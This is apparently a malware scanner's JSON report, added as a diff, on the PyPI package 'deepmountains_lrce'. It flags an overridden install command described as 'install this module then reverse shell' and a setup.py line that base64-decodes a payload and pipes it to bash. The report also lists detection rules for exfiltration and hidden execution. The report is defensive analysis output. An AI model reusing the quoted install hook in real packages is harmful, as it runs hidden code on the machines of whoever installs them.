@@ -1,0 +1,30 @@
+{
+    "issues": 2,
+    "errors": {},
+    "results": {
+        "clipboard-access": {},
+        "dll-hijacking": {},
+        "steganography": {},
+        "shady-links": {},
+        "obfuscation": {},
+        "exfiltrate-sensitive-data": {},
+        "download-executable": {},
+        "silent-process-execution": {},
+        "cmd-overwrite": [
+            {
+                "location": "setup.py:18",
+                "code": "setup(name='Deepmountains_lrce',\n      version='0.0.1',\n      description=\"install this module then reverse shell\", \n      author=\"dpm\", \n      py_module=[\"deepmountains.hello\"],\n      cmdclass={'install': CustomInstall}\n     )\n",
+                "message": "This package is overwriting the 'install' command in setup.py"
+            }
+        ],
+        "code-execution": [
+            {
+                "location": "setup.py:15",
+                "code": "    os.system('echo %s|base64 -d|bash' % encoded.decode())\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            }
+        ],
+        "exec-base64": {}
+    },
+    "path": "./dataset/pypi/deepmountains_lrce-0.0.1"
+}
